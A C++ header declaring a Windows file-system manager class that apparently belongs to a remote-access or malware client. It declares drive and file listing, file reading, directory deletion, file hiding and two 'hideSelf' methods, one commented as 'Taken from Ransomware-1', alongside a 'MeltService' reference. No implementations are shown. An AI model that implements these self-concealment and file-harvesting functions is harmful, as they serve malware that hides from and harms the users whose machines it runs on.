#pragma once
#include <Windows.h>
#include <fstream>
#include "../../../shared/NetLib/packets/packetdefs.h"
#include <vector>

class FileSystemManager
{
public:
	FileSystemManager();
	~FileSystemManager();
	std::vector<std::wstring> GetLocicalDrivesW() const;

	void hideFile(char* fileAbsolutePath);

	// This should go into MeltService
	void hideSelf();

	// Taken from Ransomware-1
	BOOL hideSelf2();

	static bool fileExists(const char* fileAbsolutePath);

	static std::ifstream::pos_type getFileSize(const char* filename);
	static std::ifstream::pos_type getFileSize(const std::wstring& filename);
	static void readBinaryFile(const wchar_t* fileName, void* buffer, DWORD bufferLen);

	static char* getDesktopPath();

	char* getWindirNot();

	bool isDirectoryExisting(const std::wstring& file);

	bool fileExists(const std::wstring& file);

	bool deleteDir(const wchar_t* path);

	void listRoots(std::vector<FileInfo>& roots);
	void listFilesW(const std::wstring& path, std::vector<FileInfo>& files) const;
};
